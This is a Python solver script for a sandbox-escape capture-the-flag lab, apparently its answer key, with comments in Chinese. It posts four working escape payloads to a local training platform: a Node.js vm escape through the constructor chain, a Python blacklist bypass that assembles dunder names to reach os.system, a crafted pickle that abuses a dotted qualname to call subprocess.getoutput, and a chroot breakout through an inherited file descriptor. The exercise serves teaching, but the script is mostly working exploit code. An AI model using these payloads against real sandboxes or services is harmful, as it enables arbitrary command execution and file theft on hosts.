#!/usr/bin/env python3
# =============================================================================
#  L1~L4 一键验证脚本（纯标准库，不依赖 requests）
# =============================================================================
#  用法：
#      python3 poc/verify.py                 # 打本机 8900
#      python3 poc/verify.py --url http://127.0.0.1:8900
#
#  它做的事：把四关的逃逸载荷依次 POST 给平台，把回显里的 FLAG{...} 抠出来。
#  建议顺序：先在页面上自己打，打不动了再看这个脚本对应哪一段。
#
#  L5 / L6 是容器级逃逸，要进容器敲命令，脚本没法代劳 ——
#  命令在 answer/ANSWERS.md 里。
# =============================================================================

import argparse
import base64
import json
import re
import sys
import urllib.error
import urllib.request

FLAG_RE = re.compile(r"FLAG\{[^}]*\}|flag\{[^}]*\}")


def post(base, level, payload):
    """POST 一个 JSON 到 /api/run/<level>，返回解析后的 dict。"""
    url = "%s/api/run/%s" % (base.rstrip("/"), level)
    data = json.dumps(payload).encode()
    req = urllib.request.Request(
        url, data=data,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=20) as resp:
            return json.loads(resp.read().decode("utf-8", "replace"))
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", "replace")
        raise SystemExit("[!] %s 返回 HTTP %d：%s" % (level, e.code, body))
    except urllib.error.URLError as e:
        raise SystemExit("[!] 连不上 %s（靶场起了吗？）：%s" % (url, e.reason))


# ---------------------------------------------------------------------------
# L1：vm 上下文里的对象还是宿主 realm 的对象
#     this.constructor          → 宿主 Object
#     .constructor              → 宿主 Function
#     Function('return process')() → 拿到宿主的 process
#     process.mainModule.require('fs') → 拿到宿主的能力
# ---------------------------------------------------------------------------
L1_PAYLOAD = (
    "this.constructor.constructor('return process')()"
    ".mainModule.require('fs').readFileSync('/flag_l1','utf8')"
)

# ---------------------------------------------------------------------------
# L2：黑名单只拦字面量，__class__ 可以拼出来，getattr 没被拉黑
#     tuple → __bases__[0] → object → __subclasses__()
#     在子类里找 __init__.__globals__ 带 system 的那个（os._wrap_close）
# ---------------------------------------------------------------------------
L2_PAYLOAD = """\
t = getattr((), '_' + '_class_' + '_')
o = getattr(t, '_' + '_ba' + 'ses_' + '_')[0]
for k in getattr(o, '_' + '_sub' + 'classes_' + '_')():
    i = getattr(k, '_' + '_in' + 'it_' + '_', None)
    g = getattr(i, '_' + '_glo' + 'bals_' + '_', None)
    if isinstance(g, dict) and 'system' in g:
        g['system']('cat /flag_l2')
        break
"""


# ---------------------------------------------------------------------------
# L3：白名单只校验 module，qualname 里的点号被 super().find_class() 展开成属性链
#     STACK_GLOBAL('models', 'subprocess.getoutput')
#       → models.subprocess.getoutput
# ---------------------------------------------------------------------------
def build_l3_payload(command="cat /flag_l3"):
    def su(s):
        b = s.encode()
        return b"\x8c" + bytes([len(b)]) + b   # SHORT_BINUNICODE

    return (
        b"\x80\x04"                             # PROTO 4（>=4 才会走点号解析）
        + su("models")                          # module —— 白名单放行的那个
        + su("subprocess.getoutput")            # name  —— 限定名，带点
        + b"\x93"                               # STACK_GLOBAL
        + su(command)                           # 参数
        + b"\x85"                               # TUPLE1
        + b"R."                                 # REDUCE + STOP
    )


# ---------------------------------------------------------------------------
# L4：fd 3 是父进程在 chroot 之前打开的「外部根」
#     fchdir(3) 把 cwd 挪出去 → chroot('.') 把根挪出去 → 读 flag
# ---------------------------------------------------------------------------
L4_PAYLOAD = """\
print("jail 里的 / ：", os.listdir("/"))
os.fchdir(3)
os.chroot(".")
os.chdir("/")
print(open("/flag_l4").read())
"""


def show(name, result):
    out = (result or {}).get("output", "")
    flags = FLAG_RE.findall(out)
    print("─" * 68)
    print("  %s" % name)
    print("─" * 68)
    if flags:
        print("  [+] 拿到 flag：%s" % ", ".join(dict.fromkeys(flags)))
    else:
        print("  [-] 没抓到 flag，原始回显：")
    for line in out.strip().splitlines()[:12]:
        print("      " + line)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", default="http://127.0.0.1:8900")
    args = ap.parse_args()
    base = args.url

    show("L1 · Node.js vm", post(base, "l1", {"code": L1_PAYLOAD}))
    show("L2 · Python 黑名单", post(base, "l2", {"code": L2_PAYLOAD}))

    b64 = base64.b64encode(build_l3_payload()).decode()
    show("L3 · pickle 限定名", post(base, "l3", {"data": b64}))

    show("L4 · chroot fd", post(base, "l4", {"code": L4_PAYLOAD}))

    print("─" * 68)
    print("  L5 / L6 在容器里，命令见 answer/ANSWERS.md")
    print("      docker exec -it sbox-sock bash")
    print("      docker exec -it sbox-priv bash")


if __name__ == "__main__":
    sys.exit(main())
